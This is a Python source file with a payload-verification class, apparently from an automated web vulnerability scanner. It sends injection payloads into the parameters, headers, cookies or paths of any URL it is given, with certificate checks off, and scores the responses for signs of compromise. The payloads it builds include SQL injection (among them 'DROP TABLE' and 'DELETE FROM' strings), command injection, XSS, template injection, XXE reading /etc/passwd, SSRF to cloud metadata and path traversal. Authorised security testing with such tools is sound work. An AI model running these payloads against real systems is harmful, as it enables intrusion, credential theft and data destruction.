import re
import logging
import asyncio
import uuid
from typing import Dict, Any, List, Optional

logger = logging.getLogger(__name__)

try:
    import httpx
except ImportError:
    httpx = None


class PayloadVerifier:
    def __init__(self, http_client=None):
        self.http_client = http_client
        self.max_retries = 2
        self.timeout = 10.0

    async def verify_payload(
        self,
        payload: str,
        element: Dict[str, Any],
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
    ) -> Dict[str, Any]:
        verification_id = str(uuid.uuid4())[:8]
        logger.debug(f"Verification {verification_id}: Testing payload '{payload[:50]}...'")

        try:
            response = await self._send_payload(payload, element, method, headers or {})
        except Exception as e:
            logger.error(f"Verification {verification_id}: Request failed - {e}")
            return {
                "verified": False,
                "error": str(e),
                "verification_id": verification_id,
            }

        indicators = self._check_indicators(response, payload)

        confirmed = (
            indicators["definite_count"] > 0
            or indicators["total_matches"] >= 2
        )

        return {
            "verified": confirmed,
            "verification_id": verification_id,
            "payload": payload,
            "status_code": response.get("status_code"),
            "indicators": indicators,
            "confirmed": confirmed,
        }

    async def verify_batch(
        self,
        payloads: List[str],
        element: Dict[str, Any],
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        concurrency: int = 3,
    ) -> List[Dict[str, Any]]:
        semaphore = asyncio.Semaphore(concurrency)
        results = []

        async def _verify_one(payload: str) -> Dict[str, Any]:
            async with semaphore:
                return await self.verify_payload(payload, element, method, headers)

        tasks = [_verify_one(p) for p in payloads]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        verified_results = []
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                verified_results.append(
                    {
                        "verified": False,
                        "error": str(result),
                        "payload": payloads[i],
                    }
                )
            else:
                verified_results.append(result)

        return verified_results

    async def _send_payload(
        self,
        payload: str,
        element: Dict[str, Any],
        method: str,
        headers: Dict[str, str],
    ) -> Dict[str, Any]:
        url = element.get("url", "")
        param_name = element.get("param_name", "")
        param_position = element.get("position", "query")

        if not url:
            return {"status_code": 0, "body": "", "headers": {}, "response_time": 0}

        if self.http_client:
            return await self._send_with_httpx(payload, url, param_name, param_position, method, headers)

        if httpx is None:
            logger.warning("httpx not installed, returning mock response")
            return await self._mock_response(payload, url)

        return await self._send_with_httpx(payload, url, param_name, param_position, method, headers)

    async def _send_with_httpx(
        self,
        payload: str,
        url: str,
        param_name: str,
        param_position: str,
        method: str,
        headers: Dict[str, str],
    ) -> Dict[str, Any]:
        import time as _time
        start = _time.time()
        try:
            async with httpx.AsyncClient(
                timeout=httpx.Timeout(self.timeout, connect=10.0),
                verify=False,
                follow_redirects=True,
                limits=httpx.Limits(max_connections=10),
            ) as client:
                if param_position == "query":
                    params = {param_name: payload} if param_name else {}
                    resp = await client.request(method, url, params=params, headers=headers)
                elif param_position == "body":
                    data = {param_name: payload} if param_name else {}
                    resp = await client.request(method, url, data=data, headers=headers)
                elif param_position == "header":
                    hdrs = dict(headers)
                    if param_name:
                        hdrs[param_name] = payload
                    resp = await client.request(method, url, headers=hdrs)
                elif param_position == "cookie":
                    cookies = {param_name: payload} if param_name else {}
                    resp = await client.request(method, url, cookies=cookies, headers=headers)
                elif param_position == "path":
                    modified_url = url.rstrip("/") + "/" + payload
                    resp = await client.request(method, modified_url, headers=headers)
                else:
                    params = {param_name: payload} if param_name else {}
                    resp = await client.request(method, url, params=params, headers=headers)

                elapsed = _time.time() - start
                body = ""
                if hasattr(resp, "text"):
                    body = resp.text
                elif hasattr(resp, "content"):
                    try:
                        body = resp.content.decode("utf-8", errors="replace")
                    except Exception:
                        body = str(resp.content)

                return {
                    "status_code": resp.status_code,
                    "body": body,
                    "headers": dict(resp.headers),
                    "response_time": round(elapsed, 4),
                }
        except httpx.TimeoutException:
            elapsed = _time.time() - start
            return {
                "status_code": 0,
                "body": "",
                "headers": {},
                "response_time": round(elapsed, 4),
                "error": "timeout",
            }
        except Exception as e:
            elapsed = _time.time() - start
            return {
                "status_code": 0,
                "body": "",
                "headers": {},
                "response_time": round(elapsed, 4),
                "error": str(e),
            }

    async def _mock_response(
        self, payload: str, url: str
    ) -> Dict[str, Any]:
        import time as _time
        await asyncio.sleep(0.01)
        return {
            "status_code": 200,
            "body": "",
            "headers": {},
            "response_time": 0.01,
            "mock": True,
        }

    def _check_indicators(
        self, response: Dict[str, Any], payload: str
    ) -> Dict[str, Any]:
        body = response.get("body", "")
        if isinstance(body, bytes):
            try:
                body = body.decode("utf-8", errors="replace")
            except Exception:
                body = str(body)

        headers = response.get("headers", {})
        header_text = "\n".join(f"{k}: {v}" for k, v in headers.items())
        combined = body + "\n" + header_text

        sql_indicators = [
            (r"ORA-\d{5}", "oracle_error"),
            (r"SQLSTATE\[[A-Z0-9]{5}\]", "sqlstate"),
            (r"You have an error in your SQL syntax", "mysql_syntax"),
            (r"unrecognized token", "sqlite_token"),
            (r"PostgreSQL.*ERROR", "postgresql"),
            (r"Unclosed quotation mark", "mssql_quote"),
            (r"SQL syntax.*MySQL", "mysql_syntax_alt"),
            (r"valid MySQL result", "mysql_result"),
            (r"pg_query\(\)", "pg_query"),
            (r"SQLite3::", "sqlite3_error"),
        ]

        cmd_indicators = [
            (r"root:x:0:0", "passwd_content"),
            (r"uid=\d+\(", "id_output"),
            (r"System32", "windows_path"),
            (r"/bin/bash", "bash_path"),
            (r"C:\\Windows", "windows_dir"),
        ]

        xss_indicators = [
            (r"<script[^>]*>", "script_tag"),
            (r"onerror\s*=", "event_handler"),
            (r"javascript:", "javascript_uri"),
        ]

        error_indicators = [
            (r"Traceback \(most recent call last\)", "python_traceback"),
            (r"java\.lang\.\w+Exception", "java_exception"),
            (r"at\s+[\w.]+\([\w.]+:\d+\)", "stack_frame"),
            (r"PHP (Fatal|Parse|Notice|Warning)", "php_error"),
        ]

        all_matches = []
        definite_count = 0

        for pattern, name in sql_indicators:
            try:
                if re.search(pattern, combined, re.IGNORECASE):
                    all_matches.append({"type": "sql", "name": name, "confidence": "definite"})
                    definite_count += 1
            except re.error:
                pass

        for pattern, name in cmd_indicators:
            try:
                if re.search(pattern, combined, re.IGNORECASE):
                    all_matches.append({"type": "command", "name": name, "confidence": "definite"})
                    definite_count += 1
            except re.error:
                pass

        for pattern, name in xss_indicators:
            try:
                if re.search(pattern, combined, re.IGNORECASE):
                    all_matches.append({"type": "xss", "name": name, "confidence": "probable"})
            except re.error:
                pass

        for pattern, name in error_indicators:
            try:
                if re.search(pattern, combined, re.IGNORECASE):
                    all_matches.append({"type": "error", "name": name, "confidence": "probable"})
            except re.error:
                pass

        payload_reflected = False
        if payload and len(payload) > 2:
            escaped = re.escape(payload)
            try:
                if re.search(escaped, body, re.IGNORECASE):
                    payload_reflected = True
                    all_matches.append(
                        {"type": "reflection", "name": "reflected_payload", "confidence": "definite"}
                    )
                    definite_count += 1
            except re.error:
                pass

        status_code = response.get("status_code", 200)
        if status_code >= 500:
            all_matches.append(
                {"type": "server_error", "name": f"http_{status_code}", "confidence": "probable"}
            )

        return {
            "total_matches": len(all_matches),
            "definite_count": definite_count,
            "probable_count": len(all_matches) - definite_count,
            "matches": all_matches,
            "payload_reflected": payload_reflected,
        }

    def generate_verification_payloads(
        self,
        original_payload: str,
        pattern_result: Dict[str, Any],
    ) -> List[str]:
        payloads = []
        categories = set()
        for match in pattern_result.get("definite", []) + pattern_result.get("probable", []):
            categories.add(match.get("category", ""))

        if "sql_errors" in categories:
            payloads.extend(self._generate_sql_verification(original_payload))
        if "command_output" in categories:
            payloads.extend(self._generate_command_verification(original_payload))
        if "xss_reflection" in categories:
            payloads.extend(self._generate_xss_verification(original_payload))
        if "ssti" in categories:
            payloads.extend(self._generate_ssti_verification(original_payload))
        if "xxe" in categories:
            payloads.extend(self._generate_xxe_verification(original_payload))
        if "ssrf" in categories:
            payloads.extend(self._generate_ssrf_verification(original_payload))
        if "error_stacks" in categories:
            payloads.extend(self._generate_error_verification(original_payload))
        if "lfi" in categories:
            payloads.extend(self._generate_lfi_verification(original_payload))

        if not payloads:
            payloads.append(self._mutate_payload(original_payload))

        seen = set()
        unique = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                unique.append(p)
        return unique[:5]

    def _generate_sql_verification(self, original: str) -> List[str]:
        payloads = []
        if "union" in original.lower():
            payloads.append("1' UNION SELECT NULL--")
            payloads.append("1 UNION SELECT NULL--")
        elif "select" in original.lower():
            payloads.append("1' AND 1=1--")
            payloads.append("1 AND 1=1--")
        elif "or" in original.lower():
            payloads.append("1' OR '1'='1")
            payloads.append("1 OR 1=1")
        elif "insert" in original.lower():
            payloads.append("1'; INSERT INTO test VALUES(1)--")
        elif "update" in original.lower():
            payloads.append("1'; UPDATE test SET col=1--")
        elif "delete" in original.lower():
            payloads.append("1'; DELETE FROM test--")
        elif "drop" in original.lower():
            payloads.append("1'; DROP TABLE test--")
        else:
            payloads.append("1' AND SLEEP(2)--")
            payloads.append("1 AND SLEEP(2)")
        return payloads

    def _generate_command_verification(self, original: str) -> List[str]:
        payloads = []
        if ";" in original:
            payloads.append("; echo test12345")
            payloads.append("; id")
        elif "|" in original:
            payloads.append("| echo test12345")
            payloads.append("| id")
        elif "`" in original or "$(" in original:
            payloads.append("`id`")
            payloads.append("$(id)")
        else:
            payloads.append("; id")
            payloads.append("| echo test12345")
        return payloads

    def _generate_xss_verification(self, original: str) -> List[str]:
        payloads = []
        if "<script" in original.lower():
            payloads.append("<script>alert(1)</script>")
            payloads.append('<script>/*\'+-/>&#]</script>')
        elif "onerror" in original.lower():
            payloads.append('<img src=x onerror=alert(1)>')
            payloads.append('<svg/onload=alert(1)>')
        elif "javascript:" in original.lower():
            payloads.append("javascript:alert(1)")
        else:
            payloads.append("<script>alert(1)</script>")
            payloads.append('<img src=x onerror=alert(1)>')
        return payloads

    def _generate_ssti_verification(self, original: str) -> List[str]:
        payloads = []
        if "{{" in original:
            payloads.append("{{7*7}}")
            payloads.append("{{config}}")
        elif "${" in original:
            payloads.append("${7*7}")
            payloads.append("${config}")
        elif "<%" in original:
            payloads.append("<%= 7*7 %>")
        else:
            payloads.append("{{7*7}}")
            payloads.append("{{config}}")
        return payloads

    def _generate_xxe_verification(self, original: str) -> List[str]:
        payloads = []
        if "ENTITY" in original.upper():
            payloads.append(
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
            )
        else:
            payloads.append(
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
            )
        return payloads

    def _generate_ssrf_verification(self, original: str) -> List[str]:
        payloads = []
        if "169.254" in original:
            payloads.append("http://169.254.169.254/latest/meta-data/")
        elif "127.0.0.1" in original or "localhost" in original:
            payloads.append("http://127.0.0.1:80/")
        else:
            payloads.append("http://169.254.169.254/latest/meta-data/")
        return payloads

    def _generate_error_verification(self, original: str) -> List[str]:
        payloads = []
        if "Traceback" in original:
            payloads.append("1' AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)--")
        elif "java.lang" in original:
            payloads.append("1' AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)--")
        else:
            payloads.append("1' AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)--")
        return payloads

    def _generate_lfi_verification(self, original: str) -> List[str]:
        payloads = []
        if "../" in original:
            payloads.append("../../../etc/passwd")
            payloads.append("....//....//....//etc/passwd")
        elif "etc/passwd" in original:
            payloads.append("../../../etc/passwd")
        elif "boot.ini" in original.lower():
            payloads.append("../../../boot.ini")
        else:
            payloads.append("../../../etc/passwd")
        return payloads

    def _mutate_payload(self, payload: str) -> str:
        if "'" in payload:
            return payload + "' OR 1=1--"
        if '"' in payload:
            return payload + '" OR 1=1--'
        return payload + "' OR 1=1--"
